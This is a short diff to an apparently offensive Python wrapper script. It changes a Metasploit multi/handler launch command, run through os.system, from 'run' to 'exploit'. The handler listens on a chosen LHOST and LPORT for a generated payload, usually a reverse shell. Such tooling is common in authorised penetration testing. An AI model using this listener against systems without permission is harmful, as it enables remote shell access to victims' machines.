@@ -81,6 +81,6 @@ elif options == "3":
 # create listener
 create_listener = str(input("Do you want to create a listener? (y/n):"))
 if create_listener == "y" or create_listener == "Y":
-    os.system(f"msfconsole -q -x \'use exploit/multi/handler; set payload {payload}; set LHOST {LHOST}; set LPORT {LPORT}; run\'")
+    os.system(f"msfconsole -q -x \'use exploit/multi/handler; set payload {payload}; set LHOST {LHOST}; set LPORT {LPORT}; exploit\'")
 else:
     sys.exit()
